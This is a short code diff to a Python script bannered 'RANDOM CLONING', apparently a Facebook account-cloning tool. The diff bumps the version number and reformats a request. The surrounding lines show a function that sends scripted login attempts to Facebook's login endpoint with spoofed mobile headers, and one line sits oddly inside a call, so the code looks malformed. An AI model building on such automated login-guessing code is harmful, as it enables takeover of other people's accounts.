@@ -86,7 +86,7 @@ logo =("""\
 \033[1;37m[*] TEAM          : HAJI NAJEEB
 \033[1;37m[*] UPDATE BY     :HAJI_
 \033[1;37m[*] Tools  Name   : RANDOM CLONING
-\033[1;37m[*] version       : 0.1
+\033[1;37m[*] version       : 0.2
 \x1b[1;97m[*]----------------------------------------------
 [*]----------------------------------------------
    \033[1;97m  (Use AirPlaNe MooD For More SpEED) \033[1;97m
@@ -245,8 +245,7 @@ def free(uid,pwx,tl):
             'upgrade-insecure-requests': '1',
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
             'viewport-width': '980',}
-response = requests.get(
-    'https://m.facebook.com/?rtime=1706931559&hrc=1&wtsid=rdr_0ffyWw8a8dcmWmxcz&refsrc=deprecated&_rdr',
+response = requests.get('https://m.facebook.com/?rtime=1706931559&hrc=1&wtsid=rdr_0ffyWw8a8dcmWmxcz&refsrc=deprecated&_rdr',
     cookies=cookies,
     headers=headers,
             lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
